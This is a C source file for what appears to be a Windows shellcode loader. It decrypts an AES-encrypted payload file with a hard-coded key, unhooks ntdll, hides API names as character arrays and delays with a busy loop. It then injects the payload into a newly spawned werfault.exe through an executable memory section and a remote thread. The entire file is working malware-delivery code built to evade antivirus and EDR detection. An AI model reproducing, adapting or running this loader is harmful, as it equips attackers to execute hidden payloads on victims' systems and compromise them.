#include <winternl.h>
#include "ntdll.h"
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


#define LARGE_NUMBER 500000
#define STATUS_SUCCESS 0
#define INJECTED_PROCESS_NAME L"\\??\\C:\\Windows\\System32\\werfault.exe"

typedef HMODULE(WINAPI* LoadLibraryW_t)(LPCWSTR lpLibFileName);

void sleep()
{
	for (int i = 0; i <= LARGE_NUMBER; i++)
	{
		for (int j = 2; j <= i / 2; j++)
		{
			if (i % j == 0)
			{
				break;
			}
		}
	}
}


int AESDecrypt(char * xcode, unsigned int xcodeSize, char * tea, size_t tealen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                        return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                        return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)tea, (DWORD)tealen, 0)){
                        return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                        return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *)xcode, (DWORD *) &xcodeSize)){
                        return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

// static key
unsigned char tea[] = { 0x4d, 0x72, 0x7a, 0x66, 0x55, 0x63, 0x6b, 0x57, 0x45, 0x46, 0x32, 0x31, 0x77, 0x65, 0x66, 0x78 };


int main(int argc, char** argv)
{


	if (argc != 2) {
		printf("Usage %s <xcode file>\n", argv[0]);
		return 1;
	}

	sleep();

	UINT64 LoadLibraryAFunc, kernel32dll;
	wchar_t ntdll_c[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0 };
	kernel32dll = GetKernel32();
	CHAR loadlibrarya_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'W', 0 };
	LoadLibraryAFunc = GetSymbolAddress((HANDLE)kernel32dll, loadlibrarya_c);
	HMODULE ntdll = (HMODULE)((LoadLibraryW_t)LoadLibraryAFunc)(ntdll_c);

	if (ntdll == NULL)
	{
		exit(1);
	}

	unhookNtdll((HMODULE)ntdll);
	loadNtdll((HMODULE)ntdll);

    HANDLE file = NULL;
    DWORD fileSize = NULL;
    DWORD bytesRead = NULL;
    LPVOID fileData = NULL;
   
    file = CreateFileA(argv[1], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        return 1;
    }
    fileSize = GetFileSize(file, NULL);
    fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
    ReadFile(file, fileData, fileSize, &bytesRead, NULL);
    unsigned char* xcode = (unsigned char*)fileData;
        
    printf("[+] Read the xcode size is %d\n", fileSize);
    
    SIZE_T xcodeSize = fileSize;
    
    HANDLE hSection = NULL;
    NTSTATUS status = NULL;
    SIZE_T size = fileSize;
    LARGE_INTEGER sectionSize = { size };
    PVOID pLocalView = NULL, pRemoteView = NULL;
    int viewUnMap = 2;

    HANDLE currentProcess = GetCurrentProcess();
    UNICODE_STRING imagePathName = {};
    PRTL_USER_PROCESS_PARAMETERS targetProcessParameters = NULL;
    PRTL_USER_PROCESS_INFORMATION targetProcessInformation = NULL;

    AESDecrypt((char *)xcode, xcodeSize, (char *) tea, sizeof(tea));

    if ((status = ZwCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS) {
        printf("[-] Cannot create section. Error code: %08X\n", status);
        return -1;
    }
    printf("[+] Section: %p\n", hSection);

    if ((status = NtMapViewOfSection(hSection, currentProcess,
        &pLocalView, NULL, NULL, NULL,
        (PULONG)&size, (SECTION_INHERIT)viewUnMap, NULL, PAGE_READWRITE)) != STATUS_SUCCESS) {
        printf("[-] Cannot create Local view. Error code: %08X\n", status);
        return -1;
    }
    printf("[+] Local view: %p\n", pLocalView);

    printf("[+] Copying xcode into the view\n");

    VxMoveMemory(pLocalView, xcode, xcodeSize);

    RtlInitUnicodeString(&imagePathName, INJECTED_PROCESS_NAME);
    RtlCreateProcessParameters(&targetProcessParameters, &imagePathName, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    targetProcessInformation = (PRTL_USER_PROCESS_INFORMATION)malloc(sizeof(PRTL_USER_PROCESS_INFORMATION));
    RtlCreateUserProcess(&imagePathName, NULL, targetProcessParameters, NULL, NULL, currentProcess, FALSE, NULL, NULL, targetProcessInformation);

    if ((status = NtMapViewOfSection(hSection, targetProcessInformation->ProcessHandle, &pRemoteView, NULL, NULL, NULL,
        (PULONG)&size, (SECTION_INHERIT)viewUnMap, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS) {
        printf("[-] Cannot create remote view. Error code: %08X\n", status);
        return -1;
    }
    printf("[+] Remote view: %p\n", pRemoteView);

    printf("[+] Sleeping for 4.27 seconds...\n");
    LARGE_INTEGER interval;
    interval.QuadPart = -1 * (int)(4270 * 10000.0f);
    if ((status = NtDelayExecution(TRUE, &interval)) != STATUS_SUCCESS) {
        printf("[-] Cannot delay execution. Error code: %08X\n", status);
        return -1;
    }
    
    HANDLE hThread = NULL;
    if ((status = ZwCreateThreadEx(&hThread, 0x1FFFFF, NULL, targetProcessInformation->ProcessHandle, pRemoteView, NULL, CREATE_SUSPENDED, 0, 0, 0, 0)) != STATUS_SUCCESS) {
        printf("[-] Cannot create thread. Error code: %08X\n", status);
        return -1;
    }
    printf("[+] Thread: %p\n", hThread);

    printf("[+] Sleeping again for 4.27 seconds...\n");
    interval.QuadPart = -1 * (int)(4270 * 10000.0f);
    if ((status = NtDelayExecution(TRUE, &interval)) != STATUS_SUCCESS) {
        printf("[-] Cannot delay execution. Error code: %08X\n", status);
        return -1;
    }

    printf("[+] Executing thread.\n");
    NtResumeThread(hThread, 0);

	FreeLibrary(ntdll);
	return 0;
}

